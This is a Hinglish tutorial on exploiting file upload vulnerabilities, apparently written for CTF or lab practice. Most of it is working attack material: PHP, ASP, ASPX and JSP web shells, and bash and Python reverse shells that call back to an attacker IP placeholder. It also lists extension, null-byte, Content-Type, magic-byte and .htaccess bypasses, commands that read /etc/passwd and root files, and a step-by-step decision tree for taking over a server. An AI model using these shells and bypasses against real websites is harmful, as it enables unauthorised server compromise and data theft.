# FILE UPLOAD VULNERABILITY — Shell Upload Karo

---

## Pehle Samjho: File Upload Vulnerability Kya Hai?

Bahut si websites pe file upload feature hota hai — profile picture, document upload, etc.
Agar website properly check nahi karti ki kaun si file upload ho rahi hai, toh tum ek PHP shell upload kar sakte ho aur server pe commands execute kar sakte ho!

**Kaise kaam karta hai:**
1. Website pe upload feature hai (image upload, profile pic, document)
2. Tum ek PHP file upload karo (jismein malicious code hai)
3. Website usse save kar le server pe
4. Tum browser se us file ko access karo
5. Tumhara PHP code execute ho jaata hai = tum commands chala sakte ho!

**Kyun hota hai?** Website sirf client-side validation karti hai (JavaScript se) ya server-side mein extension/content-type properly check nahi karti.

---

## Step 1: PHP Shell Banao

**Simple command shell (one-liner):**
```php
<?php system($_GET['cmd']); ?>
```
Isse `shell.php` naam se save karo.

**Thoda advanced shell:**
```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

**Reverse shell (better access):**
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1'"); ?>
```
Upload se pehle `nc -lvnp 4444` start karo Kali pe.

---

## CASE 1: No Filter — Direct Upload

Sabse simple case — website koi check nahi karti.

```
1. shell.php banao (upar wala code)
2. Upload form pe shell.php upload karo
3. Upload path dhundho:
   - /uploads/shell.php
   - /images/shell.php
   - /upload/shell.php
   - Upload success message mein path dikha sakta hai
4. Browser mein jaao: http://target.com/uploads/shell.php?cmd=whoami
5. Output dikhega: www-data
```

**Path kaise dhundho?**
- Upload ke baad right-click → "Copy image URL"
- Page source dekho (Ctrl+U) → image ka src attribute
- Gobuster se `/uploads/` `/upload/` directory dhundho
- Response mein file path aa sakta hai

---

## CASE 2: Extension Bypass — .php Block Ho Raha Hai

Website `.php` extension block karti hai? Ye alternatives try karo:

```
shell.phtml                # PHP as phtml
shell.php3                 # PHP version 3
shell.php4                 # PHP version 4
shell.php5                 # PHP version 5
shell.php7                 # PHP version 7
shell.pht                  # another PHP extension
shell.phps                 # PHP source (sometimes executed)
shell.php.jpg              # double extension
shell.php.png              # double extension
shell.jpg.php              # reverse double extension
shell.PHP                  # case change
shell.pHp                  # mixed case
```

**Double extension kaise kaam karti hai?**
Apache kabhi kabhi pehli known extension se execute karta hai. `shell.php.jpg` mein `.php` mil jaata hai = PHP execute!

**Null byte trick (purane servers pe):**
```
shell.php%00.jpg           # null byte ke baad sab ignore
shell.php\x00.jpg          # same thing
```

---

## CASE 3: Content-Type Bypass — Burp Suite Se

Website Content-Type header check karti hai? Burp se change karo!

**Step 1:** Burp Suite intercept ON karo
**Step 2:** Shell.php upload karo
**Step 3:** Burp mein request pakdo, Content-Type change karo:

```http
# Original (ye reject hoga):
Content-Type: application/x-php

# Ye change karo:
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

**Kya change karna hai Burp mein:**
Request body mein `Content-Disposition` ke neeche `Content-Type` line hogi — sirf wahi change karo.

```http
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg        <-- YE CHANGE KARO

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

---

## CASE 4: Magic Bytes Bypass — File Signature Check

Website file ke starting bytes (magic bytes / file signature) check karti hai.

**Solution:** Shell file ke start mein valid image ke magic bytes daalo:

```bash
# GIF header add karo (sabse easy)
# shell.php mein ye daal do:
GIF89a
<?php system($_GET['cmd']); ?>

# Ya command line se:
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php

# JPEG header (hex bytes):
printf '\xff\xd8\xff\xe0' > shell.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg

# PNG header:
printf '\x89PNG\r\n\x1a\n' > shell.php.png
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.png
```

**Best combo attack:** Magic bytes + Content-Type bypass + double extension:
```
File content: GIF89a<?php system($_GET['cmd']); ?>
Filename: shell.php.jpg
Content-Type: image/gif     (Burp se change)
```

---

## CASE 5: .htaccess Upload — Extension Rules Change Karo

Agar `.htaccess` upload kar sakte ho toh PHP execution enable kar sakte ho:

```bash
# .htaccess file banao:
echo 'AddType application/x-httpd-php .jpg' > .htaccess
```

**Step 1:** `.htaccess` upload karo (ye .jpg files ko PHP ke tarah execute karayega)
**Step 2:** Ab `shell.jpg` upload karo (jismein PHP code hai)
**Step 3:** `http://target.com/uploads/shell.jpg?cmd=whoami` — PHP execute hoga!

---

## CASE 6: Uploaded Shell Se Kaam Karo

**Basic command execution:**
```
http://target.com/uploads/shell.php?cmd=whoami
http://target.com/uploads/shell.php?cmd=id
http://target.com/uploads/shell.php?cmd=cat /etc/passwd
http://target.com/uploads/shell.php?cmd=ls -la /root/
http://target.com/uploads/shell.php?cmd=cat /root/flag.txt
http://target.com/uploads/shell.php?cmd=find / -name "flag*" 2>/dev/null
```

**Reverse shell lena (proper terminal access):**
```
# Pehle Kali pe: nc -lvnp 4444

# Phir browser mein (URL encode karna padega spaces ko):
http://target.com/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'

# Ya Python reverse shell:
http://target.com/uploads/shell.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

---

## CASE 7: ASP/ASPX/JSP Shells (Non-PHP Servers)

```asp
<!-- ASP shell (IIS / Windows): shell.asp -->
<%eval request("cmd")%>

<!-- ASPX shell: shell.aspx -->
<%@ Page Language="C#" %>
<%System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]);%>

<!-- JSP shell (Tomcat / Java): shell.jsp -->
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**Server kaise pata kare?**
- HTTP response headers dekho (Server: Apache/IIS/nginx)
- Extension dekho: `.php` pages = PHP, `.asp`/`.aspx` = IIS, `.jsp` = Java

---

## Common Mistakes (Mat Karna Ye)

1. **Upload path nahi dhundha:** Shell upload kar diya lekin access kahan se karna hai ye nahi pata — gobuster/page source se path dhundho
2. **Listener start nahi kiya:** Reverse shell upload se pehle `nc -lvnp 4444` zaruri
3. **URL encoding bhool gaye:** Browser mein spaces `+` ya `%20` se replace karo
4. **Wrong server type ka shell:** PHP shell IIS pe nahi chalega — server identify karo pehle
5. **Sirf ek bypass try kiya:** Combination use karo — magic bytes + content-type + extension sab ek saath
6. **Client-side validation mein atke:** Browser ka JS disable karo ya Burp se bypass karo — server-side check matter karta hai

---

## Quick Decision Tree

```
File upload feature mila?
  │
  ├─ Direct .php upload try karo
  │    └─ Accept ho gaya? → Access karo: /uploads/shell.php?cmd=whoami
  │
  ├─ .php blocked hai?
  │    ├─ .phtml, .php5, .php7 try karo
  │    ├─ Double extension: shell.php.jpg
  │    ├─ Case change: shell.pHp
  │    └─ Null byte: shell.php%00.jpg
  │
  ├─ Content-Type check hai?
  │    └─ Burp se Content-Type: image/jpeg change karo
  │
  ├─ Magic bytes check hai?
  │    └─ GIF89a ya PNG header add karo file ke start mein
  │
  ├─ .htaccess upload kar sakte ho?
  │    └─ AddType rule upload karo → .jpg as PHP execute hoga
  │
  ├─ Shell access mil gaya?
  │    ├─ ?cmd=whoami se verify karo
  │    ├─ Flag dhundho: ?cmd=find / -name flag*
  │    └─ Reverse shell lo: nc listener + bash one-liner
  │
  └─ PHP nahi hai server?
       ├─ IIS → .asp / .aspx shell
       └─ Java → .jsp shell
```
